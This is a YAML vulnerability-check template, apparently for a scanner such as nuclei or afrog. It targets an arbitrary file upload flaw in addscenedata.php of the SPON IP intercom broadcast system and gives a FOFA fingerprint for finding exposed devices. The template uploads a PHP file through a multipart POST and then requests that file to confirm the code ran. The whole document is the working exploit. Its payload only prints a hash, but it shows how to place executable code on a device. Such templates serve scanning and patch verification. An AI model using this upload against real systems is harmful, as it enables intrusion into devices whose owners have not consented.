id: poc-yaml-spon-addscenedata-php-anyfile-upload
info:
  name: 世邦通信SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: IP网络对讲广播系统
  fofa: icon_hash="-1830859634"
variables:
  t1: random_str(4)
  t2: md5(t1)
requests:
- method: POST
  path: /php/addscenedata.php
  headers:
    Content-Type: multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b
  data: '--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b

    Content-Disposition: form-data; name="upload"; filename="{{.t1}}.php"

    Content-Type: application/octet-stream


    <?php echo md5({{.t1}});?>

    --b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--'
  expression: status_code == 200 && contains(body,`{"res":"1"}`)
- method: GET
  path: /images/scene/{{.t1}}.php
  expression: status_code == 200 && body == t2
transport: http
